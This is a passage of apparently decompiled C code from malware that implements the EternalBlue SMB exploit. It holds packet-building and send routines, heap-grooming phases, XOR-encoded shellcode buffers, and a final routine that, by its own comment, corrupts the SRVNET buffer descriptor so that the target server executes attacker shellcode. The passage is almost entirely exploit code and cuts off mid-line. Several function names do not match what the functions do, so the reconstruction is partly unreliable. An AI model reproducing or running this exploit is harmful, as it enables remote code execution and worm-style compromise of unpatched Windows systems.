    if (!pkt) return 0xFFFFFFFF;
    uint8_t buf[0x1000];
    DWORD r = raw_socket_send_all(/* socket handled by caller context */ 0,
                                  pkt, 0);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(pkt);
    return ret;
}

/* 0x10002f88 - send SMB2 NEGOTIATE_PROTOCOL */
DWORD smb2_negotiate_send(WORD a, WORD b, WORD c, WORD *outD, WORD e,
                          WORD f, WORD g, WORD h, DWORD *outX, WORD *outY)
{
    uint16_t len = 0;
    uint32_t *pkt = build_smb1_create(a, b, c, e, f, g, &len, (BYTE)h);
    if (!pkt) return 0xFFFFFFFF;
    uint8_t buf[0x1000];
    DWORD r = raw_socket_send_all(0, pkt, 0);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = 0xFFFFFFFF;
    if (r == 0) {
        *outD = *(WORD*)(buf + 0x20);
        *outX = *(DWORD*)(buf + 9);
        *outY = 0;
    }
    heap_free(pkt);
    return ret;
}

/* 0x10003061 - send SMB1 READ */
DWORD smb1_read_send(WORD a, WORD *outB, WORD c, WORD d, WORD e)
{
    uint32_t *pkt = build_smb1_read(a, c, d, e);
    if (!pkt) return 0xFFFFFFFF;
    uint8_t buf[0x1000];
    DWORD r = raw_socket_send_all(0, pkt, 0);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = 0xFFFFFFFF;
    if (r == 0) {
        *outB = *(WORD*)(buf + 0x1C);
        ret = *(DWORD*)(buf + 9);
    }
    heap_free(pkt);
    return ret;
}

/* 0x100030fe - send SMB1 CLOSE */
DWORD smb1_close_send(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f)
{
    uint8_t *b3 = heap_alloc(3);
    if (!b3) return 0xFFFFFFFF;
    uint32_t *hdr = (uint32_t*)build_smb1_header(0x27, 0x71, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(b3); return 0xFFFFFFFF; }

    uint32_t *pkt = heap_alloc(0x27);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        *(WORD*)((BYTE*)pkt + 0x24) = *(WORD*)b3;
        *((BYTE*)pkt + 0x26) = *((BYTE*)b3 + 2);
    }
    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(b3); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x100031fb - send SMB1 LOGOFF */
DWORD smb1_logoff_send(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f)
{
    void *p = heap_alloc(7);
    if (!p) return 0xFFFFFFFF;
    *(WORD*)p = 0xFF02;

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x2B, 0x74, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(p); return 0xFFFFFFFF; }

    uint32_t *pkt = heap_alloc(0x2B);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        pkt[9] = *(DWORD*)p;
        *(WORD*)(pkt + 10) = *(WORD*)((BYTE*)p + 4);
        *((BYTE*)pkt + 0x2A) = *((BYTE*)p + 6);
    }
    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(p); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x1000330e - send SMB1 WRITE (bulk) */
DWORD smb1_write_send(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                      DWORD g, DWORD *h, void *data, WORD dataLen,
                      int *pOut, DWORD *outBuf, WORD *outLen)
{
    WORD bodyLen = 0;
    uint8_t *body = build_smb1_ioctl(g, h, data, dataLen, &bodyLen);
    if (!body) return 0xFFFFFFFF;

    WORD total = bodyLen + 0x24;
    uint32_t *hdr = (uint32_t*)build_smb1_header(total, 0x32, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(body); return 0xFFFFFFFF; }

    uint32_t *pkt = heap_alloc(total);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        memcpy((BYTE*)pkt + 0x24, body, bodyLen);
    }
    *pOut += dataLen;

    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = 0xFFFFFFFF;
    if (r == 0) {
        ret = *(DWORD*)(buf + 9);
        *outBuf = 0; *outLen = 0;
    }
    heap_free(body); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x10003469 - send SMB1 write of a 0x1000-byte chunk */
int smb1_write_chunk(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                     WORD g, void *chunk, BYTE isLast)
{
    if (!chunk) return -1;
    BYTE *par = heap_alloc(0x1015);
    if (!par) return -1;
    *(WORD*)(par + 3)  = 0x1000;
    *(WORD*)(par + 0xB) = 0x1000;
    *(WORD*)(par + 0xD) = 0x35;
    *(WORD*)(par + 0xF) = g;
    *(WORD*)(par + 0x11) = 0;
    *(WORD*)(par + 0x13) = 0x1000;
    *par = 9;
    memcpy(par + 0x15, chunk, 0x1000);

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x1015 + 0x24, 0x33, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(par); return -1; }

    uint32_t *pkt = heap_alloc(0x1015 + 0x24);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        memcpy((BYTE*)pkt + 0x24, par, 0x1015);
    }

    int ret = -1;
    if (isLast == 0) {
        ret = (int)raw_socket_send_all(0, pkt, 0x1015 + 0x24);
    } else {
        uint8_t buf[0x1000];
        if (raw_socket_send_all(0, pkt, 0x1015 + 0x24) == 0 &&
            raw_socket_recv_all(0, buf, sizeof buf) == 0)
            ret = *(int*)(buf + 9);
    }
    heap_free(par); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x100035fa - send SMB1 TREE_CONNECT */
DWORD smb1_tree_connect_send(DWORD a, WORD b, WORD c, WORD d, WORD e,
                             WORD f, WORD g, WORD h, BYTE op, BYTE final,
                             WORD i)
{
    uint16_t len = 0;
    uint32_t *pkt = build_smb1_write(i, b, c, d, e, f, g, h, op, final, &len);
    if (!pkt) return 0xFFFFFFFF;
    uint8_t buf[0x1000];
    DWORD r = raw_socket_send_all(0, pkt, 0);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(pkt);
    return ret;
}

/* 0x1000369d - send SMB1 SESSION_SETUP */
DWORD smb1_session_setup_send(WORD a, WORD b, WORD c, WORD d, WORD e)
{
    uint16_t len = 0;
    uint32_t *pkt = build_smb1_session_setup(a, b, c, d, e, &len);
    if (!pkt) return 0xFFFFFFFF;
    uint8_t buf[0x1000];
    DWORD r = raw_socket_send_all(0, pkt, 0);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(pkt);
    return ret;
}

/* 0x10003734 - full SMB1 NEGOTIATE_PROTOCOL */
DWORD smb1_negotiate_full(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                          WORD *outG, BYTE op)
{
    WORD len = 0;
    uint16_t *body = build_smb2_ioctl_body(op);
    if (!body) return 0xFFFFFFFF;
    len = (op == '\0') ? (0x33 + 0x0F) : (0x33 + 0x11);

    DWORD total = len + 0x24;
    uint32_t *hdr = (uint32_t*)build_smb1_header(total, 0xA2, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(body); return 0xFFFFFFFF; }

    uint32_t *pkt = heap_alloc(total);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        memcpy((BYTE*)pkt + 0x24, body, len);
    }
    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = 0xFFFFFFFF;
    if (r == 0) {
        *outG = 0xFFFF;
        ret = *(DWORD*)(buf + 9);
    }
    heap_free(body); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x10003863 - send SMB1 CREATE */
DWORD smb1_create_send(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                       WORD g, BYTE op, void *data)
{
    uint16_t len = 0;
    char *body = build_smb2_close_body(op, g, data, 0, &len);
    if (!body) return 0xFFFFFFFF;

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x24, 0x2F, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(body); return 0xFFFFFFFF; }

    uint32_t *pkt = heap_alloc(0x24);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        memcpy(pkt + 9, body, 0);
    }
    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0) r = raw_socket_recv_all(0, buf, sizeof buf);
    DWORD ret = (r == 0) ? *(DWORD*)(buf + 9) : 0xFFFFFFFF;
    heap_free(body); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x10003986 - SMB2 ioctl send + optional response copy */
int smb2_ioctl_send(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                    short g, WORD h, void *data, int *pOut,
                    WORD *outLen, BYTE final)
{
    WORD len = 0;
    char *body = build_smb2_close_body((BYTE)g, (WORD)h, data, 0, &len);
    if (!body) return -1;

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x24, 0x26, 0xC007,
                                                 b, c, d, e, f);
    if (!hdr) { heap_free(body); return -1; }

    uint32_t *pkt = heap_alloc(0x24);
    if (pkt) {
        memcpy(pkt, hdr, 9 * 4);
        memcpy(pkt + 9, body, 0);
    }
    int ret = -1;
    uint8_t buf[0x1000];
    DWORD r = (pkt ? raw_socket_send_all(0, pkt, 0) : 0xFFFFFFFF);
    if (r == 0 && final) {
        if (raw_socket_recv_all(0, buf, sizeof buf) == 0) {
            ret = *(int*)(buf + 9);
            *pOut = 0; *outLen = 0;
        }
    } else if (r == 0) {
        ret = *(int*)(buf + 9);
    }
    heap_free(body); heap_free(hdr); heap_free(pkt);
    return ret;
}

/* 0x10003b5d - EternalBlue phase 1 (grooming)
 * Sends 0xF chunks of 0x1000 bytes, then an SMB1 tree_connect. */
DWORD eternalblue_phase1(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f)
{
    void *pool = heap_alloc(0xF000);
    if (!pool) return 0xFFFFFFFF;
    *(DWORD*)((BYTE*)pool + 0x807) = 0x3668F383;
    memset((BYTE*)pool + 0x80B, 0x54, 0xE7F4);

    short transSeq = 0x3D0;
    for (int i = 0; i < 0xF; i++) {
        int r = smb1_write_chunk(a, b, c, d, e, f, transSeq, pool, 0);
        if (r != 0) { heap_free(pool); return 0xFFFFFFFF; }
        transSeq += 0x1000;
        pool = (BYTE*)pool + 0x1000;
    }
    heap_free(pool);
    return smb1_session_setup_send(b, c, d, e, f);
}

/* 0x10003c0a - phase 2 */
int eternalblue_phase2(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f)
{
    void *buf = heap_alloc(0x1000);
    if (!buf) return -1;
    memset(buf, 0x54, 0xB8C);
    for (DWORD i = 0; i < 0xAF; i++)
        ((BYTE*)buf)[0xB8C + i] = DAT_10010b08[i];
    memset((BYTE*)buf + 0xC3B, 0x54, 0x3C5);
    int r = smb1_write_chunk(a, b, c, d, e, f, 0xF3D0, buf, 1);
    if (r == -0x3FFFFFF3) r = 0;
    heap_free(buf);
    return r;
}

/* 0x10003ca0 - phase 3 (uses DAT_100123b0 / DAT_10012d27 XOR-encoded
 * shellcode) */
int eternalblue_phase3(BYTE op)
{
    SIZE_T len = 0;
    if (op == 0) len = 0x84;
    else if (op == 1) len = 0xB68;
    else if (op == 2) len = 0x480;

    BYTE *b = heap_alloc(len);
    if (!b) return -1;

    if (op == 0) {
        b[2] = 0xFF; b[3] = 0xF7;
        WORD s1 = (WORD)fn_time_seed();
        *(short*)(b + 4) = (short)s1;
        WORD s2 = (WORD)fn_time_seed();
        *(short*)(b + 6) = (short)s2;
    }
    if (op == 1) {
        b[8] = 3; b[0x28] = 3;
        /* static fields overwritten below by pattern from DAT_100123b0 */
        b[0xA0] = 0xB0; b[0xA1] = 0;
        b[0xA2] = 0xD0; b[0xA3] = 0xFF;
        b[0xA4] = 0xFF; b[0xA5] = 0xFF;
        b[0xA6] = 0xFF; b[0xA7] = 0xFF;
        b[0xA8] = 0xB0; b[0xA9] = 0;
        b[0xAA] = 0xD0; b[0xAB] = 0xFF;
        b[0xAC] = 0xFF; b[0xAD] = 0xFF;
        b[0xAE] = 0xFF; b[0xAF] = 0xFF;
        *(void***)(b + 0xC0) = (void**)&WOW32Reserved;
        *(void***)(b + 0xC4) = (void**)&WOW32Reserved;
        b[0x18C] = 0x90; b[0x18D] = 0xF1; b[0x18E] = 0xDF;
        b[399] = 0xFF;
        *(const void**)(b + 0x194) = (const void*)&DAT_ffdff1f0;
        b[0x1D8] = 0xF0; b[0x1D9] = 1; b[0x1DA] = 0xD0;
        b[0x1DB] = 0xFF; b[0x1DC] = 0xFF; b[0x1DD] = 0xFF;
        b[0x1DE] = 0xFF; b[0x1DF] = 0xFF;
        b[0x1E8] = 0; b[0x1E9] = 2; b[0x1EA] = 0xD0;
        b[0x1EB] = 0xFF; b[0x1EC] = 0xFF; b[0x1ED] = 0xFF;
        b[0x1EE] = 0xFF; b[0x1EF] = 0xFF;
        for (DWORD i = 0; i < 0x977; i++)
            b[0x1F1 + i] = DAT_100123b0[i] ^ 0xCC;
    }
    if (op == 2) {
        for (int i = 0; i < 0x47B; i++)
            b[i] = DAT_10012d27[i] ^ 0xCC;
    }
    int r = raw_socket_send_all(0, b, 0);
    heap_free(b);
    return r;
}

/* 0x10003dd7 - EternalBlue chunked write of the full payload */
int eternalblue_chunk(DWORD a, WORD b, WORD c, WORD d, WORD e, short f,
                      DWORD g, WORD h, int buf, DWORD bufsize, int off,
                      int *out)
{
    if (!buf) return -1;

    SIZE_T total = h + 0xC;
    uint32_t *pkt = heap_alloc(total);
    if (!pkt) return -1;
    pkt[0] = bufsize;
    int x = *out;
    *(WORD*)(pkt + 1) = h;
    pkt[2] = x;
    memcpy(pkt + 3, (BYTE*)buf + off, h);

    /* XOR 32-bit with g repeated 4x */
    DWORD seed = g;
    for (int i = 0; i < (int)total; i++) {
        DWORD sel = (i & 3);
        ((BYTE*)pkt)[i] ^= ((BYTE*)&seed)[sel];
    }
    DWORD p1 = 0, p2 = 0;
    DWORD r = smb1_write_send(a, b, c, d, e, (WORD)(f + 1), g,
                              pkt, pkt + 3, h, out, &p1, (WORD*)&p2);
    int ret = -1;
    if (r != 0xFFFFFFFF) {
        int found = 0;
        if (r == 0) found = *(short*)(p1 + 0x1A);
        ret = (found == 0x11) - 1;
    }
    heap_free(pkt);
    return ret;
}

/* 0x10003ec8 - EternalBlue ring */
int eternalblue_ring(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                     WORD *out)
{
    BYTE retry = 0;
    for (;;) {
        int r = smb1_negotiate_full(a, b, c, d, e, f, out, retry);
        if (r == -1) return -1;
        if (r == 0) break;
        retry++;
        if (retry > 1) return -1;
    }
    if (build_smb1_session_setup_trampoline(c, d, e, f, '\x03',
                                            retry, *out) != 0)
        return -1;

    DWORD len = (retry == 0) ? 0x48 : 0x38;
    DWORD total = len + 0x420;
    uint32_t *pool = heap_alloc(total);
    if (!pool) return -1;

    if (retry == 0) {
        pool[0] = 0x03000005;
        pool[1] = 0x10;
        pool[2] = total;
        pool[3] = 1;
        pool[4] = 0x450;
        pool[5] = 0x2D0000;
        pool[6] = 0x32E2A8;
        pool[7] = 1;
        pool[9] = 1;
        pool[0xB] = 0x31E5A8;
        pool[0xC] = 0x4200420;
        pool[0xD] = 0x1A72C0;
        pool[0xE] = 0x210;
        pool[0x10] = 0x210;
    } else {
        pool[0] = 0x03000005;
        pool[1] = 0x10;
        pool[2] = total;
        pool[3] = 1;
        pool[4] = 0x440;
        pool[5] = 0x80000;
        pool[7] = 100;
        pool[8] = 100;
        pool[9] = 100;
        pool[10] = 0x308140;
        pool[0xB] = 0x16;
        pool[0xC] = 0x145418;
        pool[0xD] = 0x16;
    }
    if (retry == 0) len += 0xFFFC;

    for (int i = 0; i < 0x420; i++)
        ((char*)pool)[len + i] = (char)rand() + 1;

    DWORD r = smb1_create_send(a, b, c, d, e, f, *out, 0x0E, pool);
    heap_free(pool);
    return r;
}

/* 0x1000407b - EternalBlue grooming */
int eternalblue_groom(DWORD a, WORD b, WORD c, WORD d, WORD e, WORD f)
{
    /* Local state mirrors the decompiled body */
    DWORD counter = b, x = 0, y = 0, off = 0;
    int   ret = smb1_read_send(c, (WORD*)&counter, d, e, *(WORD*)f);
    if (ret != 0) return -1;

    void *scratch = heap_alloc(0x8E);
    if (!scratch) return -1;
    void *recvBuf = heap_alloc(0x1000);
    if (!recvBuf) { heap_free(scratch); return -1; }

    *(WORD*)f += 1;
    DWORD local_20 = 0, local_c = 0x8000;

    for (;;) {
        uint16_t len = 0;
        uint32_t *p = build_smb1_write(f, (WORD)(local_c - 0x200), 0xC007,
                                       c, b, d, e, *f, 0, -1, &len);
        if (!p) break;

        memcpy(scratch, p, len);
        heap_free(p);

        p = build_smb1_write(f, (WORD)(local_c - 0x200), 0xC007,
                             c, b, d, e, *f, 0, -1, &len);
        if (!p) break;

        memcpy((BYTE*)scratch + 0x47, p, len);
        heap_free(p);

        if (raw_socket_send_all(0, scratch, 0) != 0 ||
            raw_socket_recv_all(0, recvBuf, 0x1000) != 0) break;
        if (*(DWORD*)((BYTE*)recvBuf + 9) != 0) break;

        local_20 += local_c & 0xFFFF;
        local_c  += 0x1000;
        if ((WORD)local_c > 0xC000) local_c = 0x8000;

        if (local_20 > 0xFFFFF) {
            int r = smb1_close_send(a, c, (WORD)b, d, e, *f);
            if (r == 0) {
                Sleep(0x456);
                for (int i = 0; i < 0x38; i++) {
                    *f += 1;
                    r = smb1_tree_connect_send(a, 0xFE80, 0xC007, c, d, e,
                                               *f, 0, -1, f);
                    if (r != 0) { heap_free(recvBuf); heap_free(scratch); return -1; }
                }
                heap_free(recvBuf); heap_free(scratch);
                return 0;
            }
            break;
        }
        *f += 1;
    }
    heap_free(recvBuf);
    heap_free(scratch);
    return -1;
}

/* 0x100042df - EternalBlue pool-groom + corrupt
 * This is the exploit's final step: after heap grooming, it searches the
 * SMB read response for the SRVNET buffer descriptor, overwrites the MDL
 * pointer and adjusts offsets so the server executes the attacker's
 * shellcode when it tries to free the buffer. */
int eternalblue_corrupt(DWORD a, WORD b, WORD c, WORD d, WORD e, short *f,
                        WORD g)
{
    void *marker = heap_alloc(0x10);
    if (!marker) return -1;
    *(char*)((BYTE*)marker + 0xF) = (char)rand();

    DWORD   counter = 0, local_2c = 0;
    int     local_1c = 0;
    BYTE    retry = 0;
    int     local_10 = 2;
    uint32_t *p = build_smb1_write(g, 0xFE80, 0xC007, c, d, e,
                                   (WORD)local_10, 1, -1, (WORD*)&counter);
    if (!p) { heap_free(marker); return -1; }

next_iter:
    DWORD elemLen = counter & 0xFFFF;
    DWORD elemArr = heap_alloc(elemLen * 7 & 0xFFFF);
    if (!elemArr) { heap_free(p); heap_free(marker); return -1; }

    int   *idx = NULL;
    int   *local_c = (int*)0;
    do {
        DWORD iv = (DWORD)local_c & 0xFFFF;
        if (iv == 2) {
            memcpy((BYTE*)elemArr + (elemLen & 0xFFFF) * 2, p, elemLen & 0xFFFF);
        } else {
            *f += 1;
            uint32_t *n = build_smb1_write(g, 0xFE80, 0xC007, c, d, e,
                                           (WORD)*f, 1, -1, (WORD*)&elemLen);
            if (!n) goto fail;
            memcpy((BYTE*)elemArr + (elemLen & 0xFFFF) * iv, n, elemLen & 0xFFFF);
            heap_free(n);
        }
        local_c = (int*)((int)local_c + 1);
    } while ((WORD)local_c < 7);

    void *recv = heap_alloc(0x1000);
    if (!recv) goto fail;

    if (raw_socket_send_all(0, elemArr, 0) != 0 ||
        raw_socket_recv_all(0, recv, 0x1000) != 0)
        goto fail;

    int r = smb1_ioctl_send(a, b, c, d, e, (short)local_10, 1, 0, marker,
                            &local_1c, (WORD*)&local_2c, 1);
    if (r != 0) goto fail;

    if (local_1c && local_2c > 0x39) {
        int *pEnd = (int*)(*(WORD*)(local_1c + 0x33) + 4 + local_1c);
        int *pLow = (int*)((local_2c & 0xFFFF) - 0x31 + local_1c);
        int *it   = pEnd;
        while (it < pLow) {
            if (*(short*)(local_1c + 0x1C) == *(short*)((int)it + 0x2A) &&
                *(short*)(local_1c + 0x20) == *(short*)((int)it + 0x2E) &&
                *(short*)(local_1c + 0x1E) == (short)it[0xB] &&
                (char)it[9] == 1)
            {
                DWORD good = check_pair_valid(it[-4], it[-3]);
                g_bSmbVersion = (BYTE)good;
                uint32_t base;
                int      hi;
                if (!g_bSmbVersion) {
                    base = (DWORD)it[-4];
                    if (base < 0x80000000) break;
                    hi = 0;
                    pEnd  = it - 2;
                    pLow  = it - 0xC;
                } else {
                    base = (DWORD)it[-4];
                    hi   = it[-3];
                    pEnd = it - 4;
                    pLow = it - 0x1C;
                }
                if (pEnd >= pLow) break;

                /* --- scan for the SRVNET tag 0x0C 0x02 0xFE 0x?? --- */
                if (g_bSmbVersion) {
                    while (--pLow > pEnd) {
                        if ((char)*pLow == '\f' &&
                            (char)*((BYTE*)pLow + 1) == '\x02' &&
                            *(WORD*)((BYTE*)pLow + 2) > 0xFE80)
                        {
                            DWORD ok = 0;
                            if (check_pair_valid(pLow[2], pLow[3]) &&
                                check_pair_valid(pLow[4], pLow[5]) &&
                                check_pair_valid(pLow[6], pLow[7]) &&
                                check_pair_valid(pLow[8], pLow[9]))
                                ok = 1;
                            if (ok) {
                                g_dwEB_RecvOffset   = pLow[2];
                                g_dwEB_RecvOffsetHi = pLow[3];
                                g_dwEB_Xid          = pLow[4];
                                g_dwEB_XidHi        = pLow[5];
                                goto found;
                            }
                        }
                    }
                } else {
                    while (--pLow > pEnd) {
                        if ((char)*pLow != '\f' ||
                            (char)*((BYTE*)pLow + 1) != '\x02' ||
                            *(WORD*)((BYTE*)pLow + 2) < 0xFE81) continue;
                        if ((DWORD)pLow[2] < 0x80000000) continue;
                        if ((DWORD)pLow[3] < 0x80000000) continue;
                        if ((DWORD)pLow[4] < 0x80000000) continue;
                        if ((DWORD)pLow[5] < 0x80000000) continue;
                        g_dwEB_RecvOffset   = pLow[2];
                        g_dwEB_RecvOffsetHi = 0;
                        g_dwEB_XidHi        = 0;
                        g_dwEB_Xid          = pLow[3];
                        goto found;
                    }
                }
            }
            it = (int*)((int)it + 1);
        }
    }
    goto fail;

found:
    g_dwEB_RecvCount = (WORD)it[0xC];
    DWORD delta = 0xFE80 - *(WORD*)((BYTE*)pLow + 2);
    g_dwEB_RecvLen   = delta + base;
    g_dwEB_RecvLenHi = (delta >> 31) + hi + (delta + base < delta);
    int iVar3 = (base - *it) - g_dwEB_RecvLen;

    g_dwEB_SessionSeq = 1;
    g_pEB_SendPtr     = (BYTE*)pLow + (0xFE7C - (DWORD)local_c);
    g_dwEB_WriteSeq   = (short)pEnd - (short)pLow;
    g_dwEB_CloseSeq   = (short)g_dwEB_WriteSeq - 4;
    g_dwEB_TransSeq   = (WORD)((short)g_dwEB_WriteSeq - 0x10);
    g_dwEB_SessionSeq = (short)g_dwEB_WriteSeq + 4;
    g_dwEB_RecvSeq    = (DWORD)((BYTE*)pEnd + (0x20 - (DWORD)pLow));
    g_dwEB_TreeSeq    = (WORD)((short)g_dwEB_WriteSeq + 0x38);
    g_dwEB_Phase1     = (*it == 0);
    if (g_bSmbVersion == 0) {
        g_dwEB_IoctlSeq = (short)g_dwEB_WriteSeq - 0x18;
        if (iVar3 == 0x9C)      g_dwEB_CreateSeq = (WORD)((short)g_dwEB_WriteSeq + 0x50);
        else if (iVar3 == 0xA4) g_dwEB_CreateSeq = (WORD)((short)g_dwEB_WriteSeq + 